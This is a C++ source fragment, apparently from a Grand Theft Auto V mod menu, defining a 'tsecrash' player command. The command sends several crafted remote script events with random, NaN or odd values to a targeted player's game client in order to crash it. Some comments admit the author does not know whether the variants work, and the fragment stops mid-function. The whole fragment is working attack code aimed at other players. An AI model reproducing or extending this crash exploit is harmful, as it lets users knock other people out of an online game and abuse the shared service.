...
namespace big
{
	class tsecrash : player_command
	{
		...
		virtual void execute(player_ptr player, const command_arguments& _args, const std::shared_ptr<command_context> ctx) override
		{
			...
			int64_t args2[] = { (int64_t)eRemoteEvent::Crash2, (int64_t)self::id, fuzzer::rand(256, INT32_MAX) };
			g_pointers->m_gta.m_trigger_script_event(1, args2, sizeof(args2) / sizeof(args2[0]), 1 << player->id(), (int)eRemoteEvent::Crash2);

			int64_t args3[] = { (int64_t)eRemoteEvent::Crash3, (int64_t)self::id, (int64_t)NAN, (int64_t)NAN, (int64_t)NAN, (int64_t)NAN}; // No idea if it works or not.
			g_pointers->m_gta.m_trigger_script_event(1, args3, sizeof(args3) / sizeof(args3[0]), 1 << player->id(), (int)eRemoteEvent::Crash3);

			int64_t args4[] = { (int64_t)eRemoteEvent::Crash3, (int64_t)self::id, -4640169, 0, 0, 0, -36565476, -53105203 }; // No idea if it works or not.
			g_pointers->m_gta.m_trigger_script_event(1, args4, sizeof(args4) / sizeof(args4[0]), 1 << player->id(), (int)eRemoteEvent::Crash3);

			int64_t args5[] = { (int64_t)eRemoteEvent::TSECommand, (int64_t)self::id, (int)eRemoteEvent::TSECommandSound, fuzzer::rand(INT32_MAX) }; // No idea if it works or not.
			g_pointers->m_gta.m_trigger_script_event(1, args5, sizeof(args5) / sizeof(args5[0]), 1 << player->id(), (int)eRemoteEvent::Crash3);

			int64_t args6[] = { (int64_t)eRemoteEvent::MCTeleport, (int64_t)self::id, rand() % INT64_MAX, rand() % INT64_MAX };
